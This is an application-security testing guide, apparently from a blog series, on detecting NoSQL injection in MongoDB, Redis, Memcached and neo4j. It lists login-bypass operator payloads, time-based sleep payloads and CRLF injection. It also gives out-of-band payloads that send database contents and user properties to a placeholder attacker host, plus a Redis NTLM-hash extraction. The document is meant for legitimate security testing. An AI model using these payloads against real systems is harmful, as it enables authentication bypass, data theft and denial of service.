Application Security Testing for NoSQL Injections.

INTRODUCTION

The article describes how to test the application to find NoSQL Injection vulnerabilities in various databases that do not use SQL (Structured Query Language), such as:

  • Key-value-oriented databases (Redis | Memcached | DynamoDB)
  • Document-oriented databases (MongoDB | CouchDB)
  • Wide-column-oriented database (Apache Cassandra)
  • Graph-oriented database (neo4j)

Furthermore, you will find payloads for testing Cypher Query Language.

It is good to read AppSec Tales XIII | SQLI first if you have not already.

GUIDELINES

In the below guidelines, I assume that you identified the application entry points described in the AppSec Tales XI | Input Validation:

Guidelines start from identifying the database, but relying solely on this during black box testing is not recommended. The application may use a vulnerable third-party mechanism susceptible to NoSQL attacks, so it is crucial to use all payloads anyway.

I. DB IDENTIFICATION — PORT SCAN

Conduct a port scan with a banner grabbing on the target.

  • Use nmap to conduct a full port scan with a banner grabbing because sometimes the database can work on different ports:
nmap -p- -sV TARGET_IP

Most more complex applications use an external database — located on another server. In this case, you will not find it through the port scan.

II. DB IDENTIFICATION — WEB FINGERPRINT

Use the Wappalyzer extension to check the database.

It is rare to obtain the database this way, but it’s worth trying.

III. DB IDENTIFICATION — RESPONSE

Make some basic requests and observe the responses.

  • Target components that may use a database, such as a login page, password reset, my-account edit page, and observe the responses.
  • Sometimes, you may obtain the DB through information disclosure.
  • You can speed up this process using Burp Suite Pro search functionality with the below regex:
Mongo|Cassandra|cql://|Redis|CouchDB|Memcached|DynamoDB|Neo4j|bolt://|ElasticSearch

I did not find any DB-specific endpoints to enumerate them from the URL. If you find one, let me know or make a contribution directly to the crimson wordlist.

IV. DB IDENTIFICATION — ERROR

Intentionally trigger an error and analyze the response body.

  • Check how the target handles the special characters as described in:

  • Inject NoSQL error-based polyglots and observe the response:

Check any error triggered, there may be leaked database query parts that target specific database syntax or the db name directly in the error message.

V. NoSQLI DETECTION—SQLI testing

Test for SQLI as described in the AppSec Tales XIII | SQLI.

You will likely find some clues for the NoSQLI vulnerability during casual SQLI detection. For instance, a single quote can trigger an error.

VI. NoSQLI DETECTION — Logic Operators

Use logic operators NoSQLI payloads to extract data | bypass auth.

  • Not equal
{"$ne":7}
[$ne]=7
  • Greater than
{"$gt":0}
[$gt]=0
  • Exists
{"$exists":true}
[$exists]=true
  • In
{"$in":["admin","administrator"]}
[$in][]=admin&user[$in][]=administrator
  • Where
{"user": "test","$where": "1"}
user=test&$where=1
  • And
{"$and": [ {"id": 1}, {"id": 2} ]}
$and[0][id]=1&$and[1][id]=2

# EQUAL TO:
  • Or
{"$or": [ {"id": 1}, {"id": true} ]}
$and[0][id]=1&$and[1][id]=true

# EQUAL TO: '||'1'=='1'
'||1||'
  • Regex
{ "$regex": ".*" }
[$regex]=.*

There are many cases where this would be useful, for instance, bypassing the authorization like password[$ne]=1 or exploiting IDOR like id[$gt]=1.

VII. NoSQLI DETECTION—Blind

Watch for increased response times or server interaction.

  • Out-of-bound payloads:
db.copyDatabase("\1\2\3\4\5\6\7",'test','vps_ip:80')
db.copyDatabase("\1\2\3\4\5\6\7",'test','domain_collab:80')
  • Sleep payloads:
{"$where":  "sleep(100)"}
$where=sleep(100)
;sleep(100);
'+function(){var waitTill = new Date(new Date().getTime() + 5000);while(waitTill > new Date()){};}(this)+'
'%2bfunction(){var waitTill = new Date(new Date().getTime() %2b 5000);while(waitTill > new Date()){};}(this)%2b'
'%2b(function()%7bif(typeof%20dipyx%3d%3d%3d%22undefined%22)%7bvar%20a%3dnew%20Date()%3bdo%7bvar%20b%3dnew%20Date()%3b%7dwhile(b-a%3c20000)%3bdipyx%3d1%3b%7d%7d())%2b'

Request Timer is a handy Burp extension for semi-automating the process.

VIII. NoSQLI DETECTION—Key-value-oriented databases.

Try to inject an additional value for the key in database.

  • The below payloads will set foo to evil instead of some default value that application would set (if the app is vulnerable):
{key : ["foo", "evil"]}
key[]=foo&key[]=evil
  • Use CRLF techniques described in the AppSec Tales XIX | CRLF:
"key1 0 3600 4\r\nfoo\r\nset key2 0 3600 4\r\ninject\r\n"

  • Out-of-bound Redis payloads:
MIGRATE vps_ip 80 "" 0 5000 KEYS key1 key2 key3
MIGRATE domain_collab 80 "" 0 5000 KEYS key1 key2 key3
  • NTLM hash extraction in Redis:
eval "dofile('//YOUR_IP/share')" 0

By design it is impossible to exploit NoSQLI in databases like Redis, Memcached or DynamoDB without some sort of 0-day. However, there maybe an issue in API which communicates with them. It is more like attacking the API than DB itself.
Read Ivan Novikov article about Memcached for more information.

IX. Cypher Query Language Injection (CQLI)

Use CQL-specific payloads.

  • Out-of-bound payloads:
WITH 1 as a MATCH (u:user) UNWIND keys(u) as p LOAD CSV FROM 'http://$vps_ip:80/?cypherinject_'%2bp%2b'='%2btoString(u[p]) as l RETURN 0 as _0//
OR+1%3D1+WITH+1+as+a++CALL+dbms.components%28%29+YIELD+name%2C+versions%2C+edition+UNWIND+versions+as+version+LOAD+CSV+FROM+%27http%3A%2F%2F$vps_ip:80%2F%3Fcypherinject_version%3D%27+%2B+version+%2B+%27%26name%3D%27+%2B+name+%2B+%27%26edition%3D%27+%2B+edition+as+l+RETURN+0+as+_0+%2F%2F
WITH 1 as a CALL dbms.info() yield name LOAD CSV FROM 'http://$vps_ip:80/?cypherinject_' %2b name as l RETURN 0 as _0 //
%27+WITH+1+as+a+CALL+dbms.info%28%29+yield+name+LOAD+CSV+FROM+%27http%3A%2F%2F$vps_ip:80%2F%3Fcypherinject_%27+%2B+name+as+l+RETURN+0+as+_0+%2F%2F
WITH 1 as a MATCH (u:user) UNWIND keys(u) as p LOAD CSV FROM 'http://$domain_collab/?cypherinject_'%2bp%2b'='%2btoString(u[p]) as l RETURN 0 as _0//
OR+1%3D1+WITH+1+as+a++CALL+dbms.components%28%29+YIELD+name%2C+versions%2C+edition+UNWIND+versions+as+version+LOAD+CSV+FROM+%27http%3A%2F%2F$domain_collab%2F%3Fcypherinject_version%3D%27+%2B+version+%2B+%27%26name%3D%27+%2B+name+%2B+%27%26edition%3D%27+%2B+edition+as+l+RETURN+0+as+_0+%2F%2F
WITH 1 as a CALL dbms.info() yield name LOAD CSV FROM 'http://$domain_collab/?cypherinject_' %2b name as l RETURN 0 as _0 //
WITH+1+as+a+CALL+dbms.info%28%29+yield+name+LOAD+CSV+FROM+%27http%3A%2F%2F$domain_collab%2F%3Fcypherinject_%27+%2B+name+as+l+RETURN+0+as+_0+%2F%2F
  • Use Cyphermap:
./cyphermap.py -u "http://TARGET_URL" -d "search=a*" -c "session=cookie" -s Sarah -L

There is a big chance that if the DB uses neo4j and is vulnerable, the above payloads will work. However, I could write a separate article only about the Cypher Injections. It is good to know more about the process of exploitation, which is well described on PentesterLand.

TOOLS

In this section, you can find tools and wordlist that help with the detection and exploitation of the NoSQLI.

NoSQLMAP —similar to SQLmap tool that audits and automates injection attacks and exploits configuration weaknesses in NoSQL databases. Its goal is to disclose or clone data from the database.

python NoSQLMap -u "TARGET_URL"
  • Cyphermap — A tool for mapping Cypher databases. It supports blind and time-based Cypher injection. The tool is simplistic but functional.
python cyphermap.py -u "TARGET_URL" -d "search=a*" -c "session=cookie" -s Sarah -L

BURP SUITE PRO EXTENSIONS

  • Burp Suite Professional — automatic scanner, cannot find NoSQLI, but sometimes it detects SQLI instead, which turns out to be NoSQLI.
  • NoSQLi Scanner — automatic scanner extension.
  • Cypher Injection Scanner — automatic scanner extension.

WORDLIST

  • NOSQL — wordlist contains payloads for triggering errors and sleeps.

IMPACT

Usually, NoSQLI injection leads to login bypass or information disclosure through a logic operator injection. It is also a common cause of Denial of Service due to infinite sleep payload injection.

FINAL WORDS

Checking off each item on this list will certainly help ensure that no straightforward vulnerabilities are overlooked during testing.
